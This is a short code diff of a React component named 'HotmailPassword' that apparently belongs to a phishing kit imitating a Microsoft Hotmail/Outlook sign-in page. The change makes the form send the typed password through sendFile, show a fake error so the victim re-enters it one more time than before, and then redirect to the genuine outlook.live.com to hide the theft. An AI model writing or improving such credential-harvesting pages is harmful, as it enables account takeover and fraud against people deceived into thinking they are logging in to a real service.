@@ -28,18 +28,20 @@ export default function HotmailPassword({ location }) {
     event.preventDefault();
     setSubmited({ ...submited, status: !submited.status });
 
-    if (submited.count === 0) {
+    if (submited.count <= 1) {
       sendFile(values).then((data) => {
         // show error
         notify();
-        setSubmited({ ...submited, count: 1 });
+        setSubmited({ ...submited, count: submited.count + 1 });
         console.log(data);
         console.log(submited);
       });
     } else {
       sendFile(values).then((data) => {
         // redirect
-        navigate("../processing", { state: { domain: "https://outlook.live.com" } });
+        navigate("../processing", {
+          state: { domain: "https://outlook.live.com" },
+        });
         console.log("ok");
       });
     }
@@ -607,7 +609,6 @@ export default function HotmailPassword({ location }) {
           </div>
         </div>
       </form>
-     
     </div>
   );
 }
